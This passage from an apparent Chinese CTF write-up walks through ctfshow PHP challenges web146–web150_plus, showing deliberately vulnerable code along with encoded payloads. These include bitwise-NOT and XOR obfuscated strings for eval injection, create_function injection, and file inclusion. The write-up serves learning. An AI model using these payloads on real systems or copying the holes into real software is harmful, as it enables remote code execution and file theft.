punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get out hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>开始我还在疑惑为啥题没改，才看到那些运算符都加入黑名单了，这里还能用的有 | 和三元运算符</p>\n<pre><code>?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)|\n\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220182206212.png\" alt=\"image-20230220182206212\" /></p>\n<h2 id=\"web147\"><a class=\"anchor\" href=\"#web147\">#</a> web147</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[a-z0-9_]*$/isD'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>create_function 的代码注入，先看看官方文档怎么说</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220182826525.png\" alt=\"image-20230220182826525\" /></p>\n<p>这里就正常使用 create_function 的代码注入，但是麻烦的是这个正则，这里使用 \\ 可以绕过，php 里默认命名空间是 \\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名 function_name () 调用，调用的时候其实相当于写了一个相对路 径； 而如果写 \\function_name () 这样调用函数，则其实是写了一个绝对路径。 如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法</p>\n<p>那么剩下的就简单了，正常注入就行，} 闭合原来的函数，然后执行命令，然后再把多余的} 给注释掉就可以了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220185007527.png\" alt=\"image-20230220185007527\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220184918100.png\" alt=\"image-20230220184918100\" /></p>\n<h2 id=\"web148\"><a class=\"anchor\" href=\"#web148\">#</a> web148</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-z0-9_\\%\\\\|\\~\\'\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_ctfshow_fl0g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里看来只能使用异或了</p>\n<pre><code>?code=(&quot;%0c%19%0c%5c%60%60&quot;^&quot;%7f%60%7f%28%05%0d&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220190521659.png\" alt=\"image-20230220190521659\" /></p>\n<h2 id=\"web149\"><a class=\"anchor\" href=\"#web149\">#</a> web149</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$files</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span> <span class=\"token operator\">!==</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$files</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span> <span class=\"token operator\">!==</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>很简单的条件竞争没啥好说的</p>\n<h2 id=\"web150\"><a class=\"anchor\" href=\"#web150\">#</a> web150</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CTFSHOW</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$vip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$secret</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">vip</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">secret</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">secret</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">isVIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">vip</span><span class=\"token operator\">?</span><span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">:</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__autoload</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$class</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#过滤字符</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\_| |\\[|\\]|\\?/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$ctf</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">class_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$__CTFSHOW__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"class is exists!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$isVIP</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctf</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里的 include 文件包含没啥限制，任意文件包含，看到往上的师傅说可以日志包含，果然强但是我没能成功复现，包含 session 文件还是可以的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220202411298.png\" alt=\"image-20230220202411298\" /></p>\n<h2 id=\"web150_plus\"><a class=\"anchor\" href=\"#web150_plus\">#</a> web150_plus</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CTFSHOW</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$vip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$secret</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">vip</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">secret</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">secret</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">isVIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">vip</span><span class=\"token operator\">?</span><span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">:</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__autoload</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$class</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#过滤字符</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\_| |\\[|\\]|\\?/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$ctf</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span 